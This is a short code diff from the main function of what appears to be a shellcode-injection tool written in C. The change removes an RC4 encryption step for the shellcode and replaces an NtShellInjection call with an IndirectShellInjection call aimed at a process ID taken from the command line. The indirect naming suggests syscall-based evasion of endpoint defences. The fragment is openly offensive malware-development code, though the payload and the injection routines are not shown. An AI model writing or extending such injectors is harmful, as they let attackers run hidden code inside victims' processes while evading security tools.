@@ -60,20 +60,11 @@ int main(int argc, char* argv[])
     INFO("Shellcode size: %zu bytes", sc_size);
 
 
-    CHAR("Encrypt Shellcode!\n");
-    getchar();
-
-    if (!EncryptRC4(Shellcode, sc_size))
-    {
-        WARN("Encryption Failed! Exiting...");
-        return -1;
-    }
-
     CHAR("Inject Payload!\n");
     getchar();
 
 
-    if (!NtShellInjection(atoi(argv[1]), Shellcode, Shellcode, sc_size))
+    if (!IndirectShellInjection(atoi(argv[1]), Shellcode, sc_size))
     {
         WARN("Injection Failed! Exiting...");
         return -1;
